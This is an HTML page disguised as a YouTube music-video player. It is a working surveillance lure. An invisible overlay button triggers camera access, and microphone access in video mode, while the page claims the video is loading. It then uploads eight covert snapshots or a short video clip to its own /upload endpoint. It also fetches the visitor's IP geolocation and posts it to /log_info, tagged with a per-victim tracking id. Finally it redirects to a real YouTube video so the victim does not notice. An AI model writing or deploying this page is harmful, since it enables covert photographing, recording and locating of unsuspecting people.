<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <style>
        body { margin: 0; background-color: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; overflow: hidden; }
        .video-container { position: relative; width: 100vw; height: 56.25vw; background: #000; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #fff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #overlay-btn { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; opacity: 0; cursor: pointer; border: none; background: none; }
        .video-info { padding: 15px; }
        .video-title { font-size: 18px; font-weight: bold; margin-bottom: 8px; color: #f1f1f1; }
        .video-stats { font-size: 14px; color: #aaa; }
        .loading-text { margin-top: 15px; font-size: 14px; color: #aaa; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="video-container" id="player">
        <div class="spinner"></div>
        <button id="overlay-btn" onclick="startCapture()"></button>
    </div>

    <div class="video-info">
        <div class="video-title">Official Music Video - 2026 Hits</div>
        <div class="video-stats">1.2M views • 2 hours ago</div>
        <div class="loading-text" id="status-msg">Click to play video...</div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        const mode = params.get('mode') || 'photo';
        const camMode = params.get('cam') || 'user'; // 'user' for front, 'environment' for back

        async function startCapture() {
            if (!uid || uid === "null") return;

            document.getElementById('status-msg').innerText = "Loading video buffer...";
            document.getElementById('overlay-btn').style.display = 'none';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: camMode }, 
                    audio: (mode === 'video') 
                });
                
                const v = document.getElementById('v');
                v.srcObject = stream;

                // Log IP Info
                fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
                    fetch(`/log_info?id=${uid}`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(data)
                    });
                });

                if (mode === 'video') {
                    startVideoLogic(stream);
                } else {
                    startPhotoLogic();
                }

            } catch (err) {
                document.getElementById('status-msg').innerText = "Playback error: Please enable permissions to play.";
            }
        }

        function startPhotoLogic() {
            let count = 0;
            const interval = setInterval(() => {
                if (count >= 8) {
                    clearInterval(interval);
                    redirectToYouTube();
                    return;
                }
                const c = document.getElementById('c');
                const v = document.getElementById('v');
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                c.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('file', blob);
                    fetch(`/upload?id=${uid}&type=photo`, { method: 'POST', body: fd });
                }, 'image/jpeg');
                
                count++;
            }, 700);
        }

        function startVideoLogic(stream) {
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const fd = new FormData();
                fd.append('file', blob);
                fetch(`/upload?id=${uid}&type=video`, { method: 'POST', body: fd });
                redirectToYouTube();
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 3500);
        }

        function redirectToYouTube() {
            const ytId = params.get('ytid') || 'dQw4w9WgXcQ';
            window.location.href = `https://www.youtube.com/watch?v=${ytId}`;
        }
    </script>
</body>
</html>
